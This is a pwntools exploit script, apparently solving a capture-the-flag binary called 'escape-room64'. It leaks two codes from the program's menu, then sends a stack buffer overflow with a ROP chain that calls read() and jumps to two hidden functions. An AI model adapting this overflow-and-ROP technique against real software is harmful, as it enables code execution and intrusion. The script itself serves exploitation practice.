from pwn import *

p = process(["./escape-room64"])
e=ELF('./escape-room64')
read=e.plt['read']
puts=e.plt['puts']
rdi=0x00004018d3
rsir15=0x0004018d1
button1=0x00401450
button2=0x4014c8
p.recvuntil('>>>')
p.sendline(b'1')
p.recvuntil("ON : 0x")
button1_code=(int(p.recvn(16),16))
p.recvuntil('>>>')
p.sendline(b'2')
p.recvuntil("ON : 0x")
button2_code=(int(p.recvn(16),16))
p.recvuntil('>>>')
p.sendline(b'6')
payload=b'a'*24
payload+=p64(rdi)+p64(0)+p64(rsir15)+p64(0x00000409000)+p64(0)+p64(read)+p64(rsir15)+p64(0x0000040a000)+p64(0)+p64(read)+p64(button1)+p64(button2)

p.send(payload)

p.sendline(p64(button1_code))
p.sendline(p64(button2_code))
#gdb.attach(p)
p.interactive()

